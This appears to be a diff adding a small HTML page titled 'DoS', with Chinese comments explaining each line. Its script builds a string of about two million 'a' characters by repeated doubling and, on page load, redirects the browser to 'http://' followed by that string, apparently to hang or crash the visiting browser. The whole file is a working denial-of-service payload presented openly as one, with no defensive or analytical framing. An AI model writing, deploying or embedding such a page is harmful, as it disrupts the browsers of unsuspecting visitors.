@@ -1,0 +1,45 @@
+<html>
+<title>DoS</title>
+<head>
+<script type="text/javascript">
+  // 定义一个名为 mul3 的函数，接受两个参数：一个字符串和一个数字。
+  function mul3(str, num) {
+    // 如果 num 为假值（如 0 或 undefined），返回空字符串。
+    if (!num) return "";
+    
+    // 保存原始字符串，初始化一个数组 soFar 来存储生成的字符串。
+    var orig = str,
+        soFar = [str],
+        added = 1,
+        left, i;
+
+    // 当 added 小于 num 时，继续执行以下循环。
+    while (added < num) {
+      // 计算剩余需要添加的字符数。
+      left = num - added;
+      // 将原始字符串赋值给 str。
+      str = orig;
+      // 通过不断将字符串自身拼接来扩大字符串的长度。
+      for (i = 2; i < left; i *= 2) {
+        str += str;
+      }
+      // 将生成的字符串添加到 soFar 数组中。
+      soFar.push(str);
+      // 更新已添加的字符数量。
+      added += (i / 2);
+    }
+
+    // 返回连接后的字符串，包含了生成的所有字符串。
+    return soFar.join("");
+  }
+
+  // 初始化一个字符串 junka 为 "a"。
+  var junka = "a";
+  // 调用 mul3 函数，将 junka 扩展到 2097033 个字符的长度，并将结果赋值给 junk。
+  var junk = mul3(junka, 2097033);
+  // 将页面重定向到一个由 junk 构成的非常长的 URL。
+  window.location.href = "http://" + junk;
+</script>
+</head>
+<body></body>
+</html>
